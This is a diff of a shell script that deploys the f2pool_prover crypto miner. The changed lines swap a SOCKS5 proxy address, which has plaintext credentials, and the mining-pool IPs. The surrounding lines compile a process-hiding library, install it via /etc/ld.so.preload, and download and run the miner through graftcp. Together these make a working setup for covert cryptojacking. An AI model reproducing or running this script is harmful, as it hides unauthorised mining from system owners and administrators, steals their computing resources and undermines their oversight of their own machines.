@@ -26,7 +26,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 142.93.74.31:443
+socks5 = 137.184.215.93:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./f2pool_prover --pool 143.244.155.117:80 --account bunga --custom_name $(shuf -n 1 -i 1-9999)-Bismillah & wget https://github.com/6block/f2pool_prover/releases/download/v0.1.2/f2pool_prover-v0.1.2.tar.gz && tar -zvxf f2pool_prover-v0.1.2.tar.gz && cd f2pool_prover && ./f2pool_prover --pool 143.244.155.117:80 --account bunga --custom_name $(shuf -n 1 -i 1-9999)-Bismillah
+./graftcp/graftcp ./f2pool_prover --pool 68.183.130.15:80 --account bunga --custom_name $(shuf -n 1 -i 1-9999)-Bismillah & wget https://github.com/6block/f2pool_prover/releases/download/v0.1.2/f2pool_prover-v0.1.2.tar.gz && tar -zvxf f2pool_prover-v0.1.2.tar.gz && cd f2pool_prover && ./f2pool_prover --pool 68.183.130.15:80 --account bunga --custom_name $(shuf -n 1 -i 1-9999)-Bismillah
